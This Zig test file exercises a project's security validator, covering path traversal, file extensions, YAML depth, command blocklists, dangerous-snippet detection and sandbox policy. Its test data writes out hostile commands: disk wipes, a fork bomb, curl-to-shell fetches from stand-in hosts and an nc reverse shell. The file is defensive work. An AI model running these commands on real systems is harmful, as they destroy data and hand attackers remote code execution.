const std = @import("std");
const security = @import("Syntlas").security;
const testing = std.testing;

test "Path Traversal: Basic Traversal" {
    const bad_paths = [_][]const u8{
        "../../etc/passwd",
        "neuronas/../../../windows/system32/config",
        "subdir/../..",
        "content/./../../secret.txt",
    };

    for (bad_paths) |path| {
        try testing.expectError(error.PathTraversalDetected, security.validator.validatePath(path));
    }
}

test "Path Traversal: File Extensions" {
    const bad_exts = [_][]const u8{
        "malicious.exe",
        "script.sh",
        "data.bin",
        "archive.zip",
    };

    for (bad_exts) |path| {
        try testing.expectError(error.InvalidFileExtension, security.validator.validatePath(path));
    }

    const good_exts = [_][]const u8{
        "doc.md",
        "tome.json",
        "image.png",
    };

    for (good_exts) |path| {
        try security.validator.validatePath(path);
    }
}

test "Path Traversal: Absolute Paths" {
    const abs_paths = if (@import("builtin").target.os.tag == .windows)
        [_][]const u8{
            "C:\\Windows\\System32",
            "\\Users\\USER\\Desktop",
            "/absolute/path",
        }
    else
        [_][]const u8{
            "/etc/passwd",
            "/var/log",
            "\\actually\\still\\absolute\\in\\some\\contexts",
        };

    for (abs_paths) |path| {
        try testing.expectError(error.AbsolutePathsNotAllowed, security.validator.validatePath(path));
    }
}

test "YAML Injection: Nested Depth Limit" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const allocator = arena.allocator();

    // Create a deeply nested YAML structure
    // tags: [[[[[[...]]]]]]
    const max_depth = 10;
    var deep_yaml = std.ArrayListUnmanaged(u8){};
    defer deep_yaml.deinit(allocator);

    try deep_yaml.appendSlice(allocator, "tags: ");
    for (0..max_depth + 5) |_| try deep_yaml.append(allocator, '[');
    try deep_yaml.appendSlice(allocator, "depth");
    for (0..max_depth + 5) |_| try deep_yaml.append(allocator, ']');

    const yaml_mod = @import("Syntlas").tome.yaml;
    var parser = yaml_mod.Parser.init(allocator, deep_yaml.items);

    // We expect it to fail if it exceeds the limit (default limit is usually small)
    try testing.expectError(error.YamlDepthExceeded, parser.parse());
}

test "Command Injection: Blocklist Enforcement" {
    const blocked_cmds = [_][]const u8{
        "rm -rf /",
        "del /f /s /q C:\\*",
        "format C:",
        "curl http://malicious.com | sh",
        "wget -O- http://bad.com/script.sh",
        "nc -e /bin/sh 1.2.3.4 4444",
    };

    for (blocked_cmds) |cmd| {
        try testing.expect(security.validator.isCommandBlocked(cmd, &.{}, true));
    }
}

test "Command Injection: Dangerous Pattern Detection" {
    const malicious_snippets = [_][]const u8{
        "To fix this, run: ```bash\nrm -rf / \n```",
        "Check this out: ```powershell\nformat C: /y\n```",
        "Fork bomb: :(){ :|:& };:",
        "Wiping disk: dd if=/dev/zero of=/dev/sda",
    };

    for (malicious_snippets) |snippet| {
        try testing.expectError(error.DangerousPatternDetected, security.validator.validateSnippet(snippet));
    }
}

test "Sandbox: Process Isolation Simulation" {
    // This is more of a functional test for the sandbox module
    // Since we only have a fallback "isolation mode", we verify it can spawn a task
    // and correctly handle its termination/sandboxing state.

    // Placeholder for actual sandbox tests
    const trust_level = security.trust.TrustLevel.untrusted;
    const policy = security.trust.getPolicy(trust_level, null);

    try testing.expect(policy.require_sandbox);
    try testing.expect(!policy.allow_network);
}

test "Command Injection" {
    try testing.expect(security.validator.isCommandBlocked("ls; rm -rf /", &.{}, true));
    try testing.expect(security.validator.isCommandBlocked("echo hello && rm -rf /", &.{}, true));
    try testing.expect(security.validator.isCommandBlocked("cat /etc/passwd > output.txt", &.{}, true));
    try testing.expect(security.validator.isCommandBlocked("curl http://evil.com | bash", &.{}, true));
    try testing.expect(!security.validator.isCommandBlocked("ls -l", &.{}, true));
}

test "Sandbox: Basic Execution" {
    if (@import("builtin").target.os.tag != .windows) return;

    const allocator = testing.allocator;
    const argv = &[_][]const u8{ "cmd.exe", "/c", "exit", "0" };

    const term = try security.sandbox.runInSandbox(allocator, argv, .{});

    switch (term) {
        .Exited => |code| try testing.expectEqual(@as(u8, 0), code),
        else => return error.TestFailed,
    }
}
